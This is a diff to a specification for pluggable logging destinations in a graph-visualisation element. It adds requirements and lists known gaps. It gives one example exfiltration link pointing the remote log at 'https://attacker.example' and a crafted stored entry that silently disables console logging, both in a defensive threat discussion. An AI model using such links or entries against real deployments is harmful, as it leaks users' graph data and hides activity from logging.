@@ -45,10 +45,17 @@ non-empty; `description` a sentence; `options` an array (README section 7).
    result. An unregistered id is `E_UNKNOWN_SINK` with `details.available`.
 3. A live object MAY be attached directly with `GraphtyLogger.addSink(sink)` or by putting it in
    `configure({ sinks: [sink] })`; a live object cannot be stored or named, which is why the
-   registry exists.
-4. `create` MUST return a `Sink` whose `name` equals `descriptor.id` **(not yet enforced)**. The
-   name is what `removeSink` takes and what a second attachment replaces; a factory that returns a
-   different name makes the same configuration attach two destinations.
+   registry exists. A configuration read from storage or parsed from JSON MUST be treated as
+   references only (`{ use, options }`): an entry is a live sink only when it arrives through the
+   in-memory API and its `write` is a function. **(not yet met)** `configure()` treats any entry
+   with a `write` key as a live sink, so a stored configuration edited to hold
+   `{ "name": "console", "write": 0 }` attaches an object whose every write throws and is
+   swallowed, blinding the console without registering any code.
+4. The element MUST attach a registered destination under `descriptor.id`, ignoring the `name` its
+   factory returns. **(not yet met)** 2.6.1 attaches it under the returned name, so a factory can
+   return `"console"` and silently replace the element's console destination (the reserved ids are
+   bypassed), and a factory returning any other name makes one configuration attach two
+   destinations.
 5. Attaching a destination under a name already attached replaces it, and the replaced one's
    `dispose` is called.
 6. `configure` MERGES: attaching a destination does not reset the level, the modules or other
@@ -129,16 +136,31 @@ This is the extension point most likely to move graph data off the page.
 2. A destination that sends records off the page MUST document where, and SHOULD offer an option
    that drops `data` and `error` stacks. The recommended descriptor fields for declaring this
    (`destinations`, `forwardsData`) are README open decision 13; with them a settings panel can show
-   "sends to logs.example.com, including graph data" before a reader turns it on.
+   "sends to logs.example.com, including graph data" before a reader turns it on. Those fields are
+   the author's CLAIM and nothing verifies them: the element hands every destination the full
+   record. The same decision recommends that the element strip `data` and error stacks before a
+   non-built-in destination's `write` by default, and that the page's Content-Security-Policy
+   `connect-src` be the enforcement (README section 9.4).
 3. Log records are not the reproducibility record. What an analysis ran, with which parameters and
    seed, is the run record and the methods text; a consumer MUST NOT rely on logs for it, and a
    destination MUST NOT be required for a result to be reproducible.
 4. A logging configuration read from storage, or built from a page URL with `parseLoggingURLParams`
    (which reads `graphty-element-logging` and `graphty-element-remote-log`), can turn on only
-   destinations already registered by code; it can never load code. It CAN turn on the built-in
-   `remote` destination with an arbitrary URL, which sends records to that URL. The element no
-   longer reads the page URL by itself; a consumer that chooses to honour those parameters SHOULD
-   do so only in development builds.
+   destinations already registered by code; it can never load code. But it CAN turn on the
+   built-in `remote` destination with an arbitrary URL, which sends every record to that URL:
+   a link carrying `?graphty-element-remote-log=https://attacker.example`, followed by an analyst,
+   exfiltrates graph content without loading any code. Therefore:
+   - No configuration document (style, recipe, annotation, view, project) may carry a logging
+     configuration at all (README section 9.2 item 3).
+   - The `remote` destination, and any destination whose descriptor declares egress, MUST NOT be
+     enabled from stored or URL-derived configuration unless its origin is on an allowlist the
+     embedder set in code (open decision 13).
+   - `parseLoggingURLParams` MUST refuse to enable `remote` unless the embedder opted in.
+     **(not yet met)** It only checks that the value is a valid URL.
+   The element no longer reads the page URL by itself.
+5. An option that is a credential (an API key, a DSN) is stored with the rest of the configuration
+   and replayed; a destination MUST NOT take one as an option until a `secret` option type exists
+   (README section 7 item 10).
 
 ## 8. Conformance checks
 
@@ -156,7 +178,8 @@ Run by `checkLogSink(registration, { options })` in the proposed kit. All run in
 | does not recurse | `write` emits no record through `GraphtyLogger` |
 | survives a stored configuration | the configuration, serialised to JSON and read back, attaches it again |
 | disposes cleanly | after `removeSink`, `dispose` was called and no timer it created is alive |
-| flush settles | `flush`, when present, settles within 5 seconds with the network unavailable |
+| flush settles | `flush`, when present, settles with the network unavailable before the kit's hang timeout |
+| egress matches its claim | with network calls trapped, a destination that declares `destinations` contacts only those origins, and one that declares none contacts nothing |
 
 ## 9. Worked example
 
@@ -178,7 +201,7 @@ registerLogSink({
         ],
     },
     create: (options): Sink => {
-        const capacity = options.capacity as number;
+        const capacity = options.capacity as number;   // the cast goes once typed options ship (README section 7 item 8)
         const lines: string[] = [];
         return {
             name: "acmexr-ring",
@@ -201,7 +224,11 @@ await GraphtyLogger.configure({ sinks: [{ use: "acmexr-ring", options: { capacit
 ## 10. Known gaps
 
 - The guide says a registered destination receives records immediately (section 3 item 1).
-- `create`'s returned `name` is not checked against the id (section 3 item 4).
+- A registered destination is attached under the name its factory returns, not its id, so it can
+  replace `console` (section 3 item 4).
+- A stored configuration entry with a `write` key is attached as a live sink (section 3 item 3).
+- Stored or URL-derived configuration can enable `remote` with any URL (section 7 item 4).
+- The element redacts nothing before a third-party destination sees a record (section 7 item 2).
 - `configure()` re-attaches a removed console (section 5).
 - No declaration of where a destination sends data (section 7; open decision 13).
 
